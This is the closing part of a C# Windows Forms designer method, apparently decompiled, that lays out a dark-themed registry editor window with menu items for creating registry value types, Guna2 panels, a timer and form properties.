			binaryValueToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			binaryValueToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			binaryValueToolStripMenuItem1.Name = "binaryValueToolStripMenuItem1";
			binaryValueToolStripMenuItem1.Size = new System.Drawing.Size(211, 22);
			binaryValueToolStripMenuItem1.Text = "Binary Value";
			binaryValueToolStripMenuItem1.Click += new System.EventHandler(createBinaryRegistryValue_Click);
			dWORD32bitValueToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			dWORD32bitValueToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			dWORD32bitValueToolStripMenuItem1.Name = "dWORD32bitValueToolStripMenuItem1";
			dWORD32bitValueToolStripMenuItem1.Size = new System.Drawing.Size(211, 22);
			dWORD32bitValueToolStripMenuItem1.Text = "DWORD (32-bit) Value";
			dWORD32bitValueToolStripMenuItem1.Click += new System.EventHandler(createDwordRegistryValue_Click);
			qWORD64bitValueToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			qWORD64bitValueToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			qWORD64bitValueToolStripMenuItem1.Name = "qWORD64bitValueToolStripMenuItem1";
			qWORD64bitValueToolStripMenuItem1.Size = new System.Drawing.Size(211, 22);
			qWORD64bitValueToolStripMenuItem1.Text = "QWORD (64-bit) Value";
			qWORD64bitValueToolStripMenuItem1.Click += new System.EventHandler(createQwordRegistryValue_Click);
			multiStringValueToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			multiStringValueToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			multiStringValueToolStripMenuItem1.Name = "multiStringValueToolStripMenuItem1";
			multiStringValueToolStripMenuItem1.Size = new System.Drawing.Size(211, 22);
			multiStringValueToolStripMenuItem1.Text = "Multi-String Value";
			multiStringValueToolStripMenuItem1.Click += new System.EventHandler(createMultiStringRegistryValue_Click);
			expandableStringValueToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			expandableStringValueToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			expandableStringValueToolStripMenuItem1.Name = "expandableStringValueToolStripMenuItem1";
			expandableStringValueToolStripMenuItem1.Size = new System.Drawing.Size(211, 22);
			expandableStringValueToolStripMenuItem1.Text = "Expandable String Value";
			expandableStringValueToolStripMenuItem1.Click += new System.EventHandler(createExpandStringRegistryValue_Click);
			timer1.Interval = 2000;
			timer1.Tick += new System.EventHandler(timer1_Tick);
			guna2Panel1.Controls.Add(guna2Separator1);
			guna2Panel1.Controls.Add(label1);
			guna2Panel1.Controls.Add(pictureBox1);
			guna2Panel1.Controls.Add(guna2PictureBox1);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
			guna2Panel1.Location = new System.Drawing.Point(0, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(895, 67);
			guna2Panel1.TabIndex = 3;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-202, 61);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1299, 10);
			guna2Separator1.TabIndex = 13;
			guna2Separator1.UseTransparentBackground = true;
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.LightGray;
			label1.Location = new System.Drawing.Point(388, 20);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(72, 19);
			label1.TabIndex = 12;
			label1.Text = "Regedit";
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 12);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 42);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 11;
			pictureBox1.TabStop = false;
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(854, 12);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 7;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(895, 650);
			base.Controls.Add(tableLayoutPanel);
			base.Controls.Add(guna2Panel1);
			Font = new System.Drawing.Font("Electrolize", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.FromArgb(198, 25, 31);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.MainMenuStrip = menuStrip;
			base.Name = "FormRegistryEditor";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Registry Editor []";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormRegistryEditor_FormClosed);
			base.Load += new System.EventHandler(FrmRegistryEditor_Load);
			tableLayoutPanel.ResumeLayout(false);
			tableLayoutPanel.PerformLayout();
			statusStrip.ResumeLayout(false);
			statusStrip.PerformLayout();
			menuStrip.ResumeLayout(false);
			menuStrip.PerformLayout();
			splitContainer.Panel1.ResumeLayout(false);
			splitContainer.Panel2.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)splitContainer).EndInit();
			splitContainer.ResumeLayout(false);
			guna2Panel2.ResumeLayout(false);
			guna2Panel2.PerformLayout();
			tv_ContextMenuStrip.ResumeLayout(false);
			selectedItem_ContextMenuStrip.ResumeLayout(false);
			lst_ContextMenuStrip.ResumeLayout(false);
			guna2Panel1.ResumeLayout(false);
			guna2Panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			ResumeLayout(false);
		}
	}
}
